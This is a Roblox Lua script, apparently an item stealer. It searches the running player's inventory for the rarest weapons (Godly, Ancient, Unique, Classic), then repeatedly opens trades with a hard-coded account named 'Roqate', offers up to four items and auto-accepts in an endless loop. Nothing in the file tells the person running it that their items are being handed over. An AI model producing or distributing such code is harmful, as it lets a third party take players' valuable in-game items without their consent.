local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 5
local ITEM_ADD_DELAY = 0.3

-- Priority: lower = better
local RARITY_PRIORITY = {
    Godly = 1,
    Ancient = 2,
    Unique = 3,
    Classic = 4
}

local ALLOWED_RARITIES = {}
for rarity,_ in pairs(RARITY_PRIORITY) do
    ALLOWED_RARITIES[rarity] = true
end

local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

local isTrading = false
local lastTradeTime = 0

-- Find exact inventory module
local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

local function findPlayer(name)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == name:lower() then
            return p
        end
    end
    return nil
end

local function isTradeGUIOpen()
    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
end

-- Collect best weapons with correct inventory detection
local function getBestWeapons()
    local inv = getCorrectMyInventory()
    if not inv then
        warn("❌ Could not find correct MyInventory!")
        return {}
    end

    local allWeapons = {}

    for categoryName, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(allWeapons, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    -- Sort best → worst
    table.sort(allWeapons, function(a, b)
        return a.priority < b.priority
    end)

    local picked = {}
    for i = 1, math.min(#allWeapons, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, allWeapons[i].name)
    end

    return picked
end

local function addWeaponsToTrade()
    local weapons = getBestWeapons()
    if #weapons == 0 then
        warn("⚠ No valid high-rarity weapons found!")
        return false
    end

    print("✅ Adding best weapons to trade:")
    for _, w in ipairs(weapons) do
        print("   →", w)
        TradeRemotes.OfferItem:FireServer(w, "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end
    return true
end

local function acceptTrade()
    if not isTradeGUIOpen() then
        warn("⚠ Trade GUI not open!")
        return false
    end
    TradeRemotes.AcceptTrade:FireServer(285646582)
    return true
end

local function initiateTrade(targetPlayer)
    if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then return end

    isTrading = true
    print("🔄 Starting trade with " .. targetPlayer.Name .. "...")

    local ok, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)

    if not ok then
        warn("❌ Trade request failed:", err)
        isTrading = false
        return
    end

    task.wait(1)

    if not isTradeGUIOpen() then
        warn("⚠ Trade GUI didn't open!")
        isTrading = false
        return
    end

    if not addWeaponsToTrade() then
        warn("⚠ No valid weapons to trade!")
        isTrading = false
        return
    end

    if acceptTrade() then
        print("✅ aaTrade with " .. targetPlayer.Name .. " completed!")
    else
        warn("❌ Failed to accept trade!")
    end

    isTrading = false
    lastTradeTime = os.time()
end

while true do
    local target = findPlayer(TARGET_PLAYER)
    if target then
        initiateTrade(target)
    else
        print(TARGET_PLAYER .. " not found. Waiting...")
    end
    task.wait(5)
end
